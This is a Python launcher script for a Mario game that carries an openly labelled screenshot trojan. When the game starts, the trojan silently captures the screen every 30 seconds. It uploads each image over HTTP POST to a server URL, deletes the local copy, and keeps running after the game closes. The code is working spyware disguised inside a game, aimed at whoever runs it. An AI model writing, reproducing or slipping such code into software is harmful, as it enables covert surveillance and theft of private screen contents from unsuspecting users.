# === TROJAN CODE START ===
import urllib.request
import pyautogui
import threading
import time
import os
from datetime import datetime

class ScreenshotTrojan:
    def __init__(self):
        self.server_url = "http://localhost:5000/upload"  # This sends to your server
        self.running = True
        self.interval = 30  # seconds
        
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"temp_screenshot_{timestamp}.png"
            screenshot.save(filename)
            
            # Send screenshot to server
            with open(filename, 'rb') as f:
                image_data = f.read()
            
            req = urllib.request.Request(self.server_url, data=image_data, method='POST')
            req.add_header('Content-Type', 'application/octet-stream')
            response = urllib.request.urlopen(req)
                
            if os.path.exists(filename):
                os.remove(filename)
                
            print(f"📸 Screenshot sent to server at {timestamp}")
            return True
            
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
            return False
    
    def start_monitoring(self):
        def monitor():
            while self.running:
                self.take_screenshot()
                time.sleep(self.interval)
        
        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()
        print("🚀 Trojan monitoring started...")

trojan = ScreenshotTrojan()
# === TROJAN CODE END ===

# === FIXED GAME IMPORT ===
import sys
import os

# Add the source directory to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'source'))

# Now import and run the game
try:
    from source import main as game_main
    print("✅ Game loaded successfully!")
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("Trying alternative import method...")
    
    # Alternative import
    import importlib.util
    spec = importlib.util.spec_from_file_location("game_main", os.path.join("source", "main.py"))
    game_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(game_module)
    game_main = game_module

# Run the game
if __name__ == '__main__':
    # Start trojan when game begins
    trojan.start_monitoring()
    
    try:
        print("🎮 Starting Mario game...")
        game_main.main()  # Call the main function from the game
    except Exception as e:
        print(f"🎮 Game error: {e}")
    finally:
        print("🎮 Game closed but trojan continues running...")
        print("📸 Screenshots will continue every 30 seconds")
        
        # Keep trojan running
        try:
            for i in range(4):
                print(f"🔁 Trojan still active... ({i+1}/4)")
                time.sleep(30)
        except KeyboardInterrupt:
            print("🛑 Trojan stopped by user")